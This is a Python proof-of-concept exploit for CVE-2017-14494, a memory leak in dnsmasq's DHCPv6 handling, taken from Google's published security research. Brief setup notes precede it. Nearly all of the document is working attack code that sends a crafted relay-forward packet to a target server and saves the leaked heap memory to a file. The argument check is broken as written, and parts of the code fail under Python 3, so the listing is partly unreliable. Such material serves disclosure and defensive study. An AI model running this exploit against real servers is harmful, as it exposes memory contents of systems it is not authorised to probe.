'''
Sources:
https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14494.py
https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html

Sadly, there are no easy docker setup instructions available.

Setup a simple network with dnsmasq as dhcpv6 server. Run any dhcpv6 client on the clients machine and obtain the network packets. Look for the server identifier inside the dhcpv6 packets. Then, run the poc on the client:
# python /poc.py  <ipv6 addr> <server id, hexencoded>
The poc will create a response.bin file with 32k bytes worth of ram, beginning at the buffer + 38.

'''

#!/usr/bin/env python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/
from binascii import unhexlify
from struct import pack
import socket
import sys

# num bytes to leak. < 0xFFFF, exact upper limit not tested.
N_BYTES = 0x8000

def send_packet(data, host, port):
    print("[+] sending {} bytes to [{}]:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")

    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

def inner_pkg(duid):
    OPTION6_SERVER_ID = 2
    return b"".join([
        u8(5),            # Type = DHCP6RENEW
        u8(0), u16(1337), # ID
        gen_option(OPTION6_SERVER_ID, duid),
        gen_option(1, "", length=(N_BYTES - 8 - 18)) # Client ID
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 2, "{} <ip> <duid>".format(sys.argv[0])
    # No automated way to obtain a duid, sorry. Not a programming contest after all.
    host, duid = sys.argv[1:]
    duid = unhexlify(duid)
    assert len(duid) == 14
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        '?',
        # Client addr
        '\xFD\x00',
        '\x00\x00' * 6,
        '\x00\x05',
        '_' * (33 - 17), # Skip random data.
        # Option 9 - OPTION6_RELAY_MSG
        gen_option(9, inner_pkg(duid), length=N_BYTES),
    ])

    # Setup receiving port
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, N_BYTES)
    s.bind(('::', 547))

    # Send request
    send_packet(pkg, host, 547)

    # Dump response
    with open('response.bin', 'wb') as f:
        f.write(s.recvfrom(N_BYTES)[0])